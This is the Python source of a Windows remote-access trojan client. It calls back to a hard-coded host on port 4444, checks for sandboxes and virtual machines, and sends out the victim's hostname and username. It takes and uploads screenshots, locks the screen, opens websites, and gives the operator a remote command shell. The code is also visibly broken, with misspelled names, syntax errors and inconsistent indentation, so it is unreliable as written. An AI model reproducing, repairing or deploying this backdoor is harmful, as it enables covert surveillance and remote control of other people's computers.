import socket, os, sys, platform, time, ctypes, subprocess, threading, wmi, webbrowser, pyscreeze

import win32api, winerror, win32event, win32crypt

from winreg import *

strHost = "192.168.1.11"

intPort = 4444

strPath = os.path.realpath(sys.argv[0])

TMP = os.environ['APPDATA']

intBuff = 1024

mutex = win32event.CreateMute(None, 1, "PA_mutex_xp4")

if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    sys.exit(0)

def detectSandboxie():
    try:
        libHandle =ctypes.windll.LoadLibrary("sbieDll.dll")
        return" (Sandboxie) "
    
    except: return ""

def detectVM():
    objWMI = wmi.WMI ()
    for objDiskDrive in objWMI.query ("Select * from Win32_DiskDrive"):
        if "vbox" in objDiskDrive.Caption.lower() or "virtual" in objDiskDrive.Caption.lower() :
            return "(Virtual Machine)"
        return ""
        
def server_connect() :
                global objSocket

                while True:
                try:
                    objSocket = socket.socket ()
                    objSocket.connect ((strHost,intPort))

                except socket.error:
                    time.sleep(5)

                else: break
        
        struserInfo = socket.gethostname() + "'," +platform.system()+ " "+ platfor.release() + detectSandboxie() + detectVM() + "'," + os.environ["USERNAME"]
        send (str.encode(struserInfo))

decode_utf8 = lambda data: data.decode("utf-8")

recv = lambda butter: objSocket.recv(butter)

send = lambda data: objSocket.send (data)

server_connect()


def screenshot():
    pyscreeze.screenshot(TMP + "/s.png")
    send(str.encode("Receiving screenshot" + "\n" + "File size: " + str(os.path.getsize(TMP + "/s.png"))
        + "bytes" + "\n" + "Please wait...."))
    
    objPic = open(TMP + "/s.png", "rb")
    time.sleep(1)

    send(objPic.read())
    objPic.close()

def lock ():
    ctypes.windll.user32.LockWorkStation()


def command_shell():
     strCurrentDir = (os.getcwd())
     send(str.encode(strCurrentDir))

    while True:
        strData = decode_utf8(recv(intBuff))

        if strData == "goback":
             os.chdir(strCurrentDir)

        elif strData[:2].lower()== "cd" or strData[:5].lower()=="chdir":
            objCommand = subprocess.Popen(strData + " & cd", stdout= subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE, shell = True)
            if (objCommand.stderr.read()).decode("utf-8")== "":
                strOutput = (objCommand.stdout.read()).decode("utf-8").splitlines()[0]
                os.chdir(strOutput)


                bytData = str.encode("\n" + str(os.getcwd()) + ">") #output to send the server

        elif len(strData) > 0:
            objCommand = subprocess.Popen(strData, stdout= subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE, shell = True)

            strOutput = (objCommand.stdout.read() + objCommand.stderr.read()).decode("utf-8", errors= "replace")
        
            bytData = str.encode("\n" + str(os.getcwd()) + ">")
        
    else:
     bytData = str.encode("Error !!")

    strBuffer = str(len(bytData))

    send(str.encode(strBuffer))
    time.sleep (0.1)
    send(bytData)

        
    
    


def MessageBox(message):
        objVBS = open(TPM + "/m.vbs","w")
        objVBS.write("Msgbox \ "" + message + "\", vbOKOnly+vbInformation+vbSystemModal,  \"Menssage\"")
        objVBS.close()

    subprocess.Popen(["cscript", TMP + "/m.vbs"], shell = True)


while True:
    try:
        while True:
                strData = recv(intBuff)
                strData = decode_utf8(strData)

                if strData == "exit":
                    objSocket.close()
                    sys.exit(0)

                elif strData[:3] == "msg":
                    MessageBox(strData[:3])

                elif strData[:4] == "site":
                    webbrowser.get().open(strData[4:])

                elif strData == "screen":
                    screenshot()
                
                elif strData = "lock":
                    lock()
                
                elif strData == "cmd":
                     command_shell()
                
                    

        except socket.error:
        objSocket.close()
        del objeSocket

        server_connect()

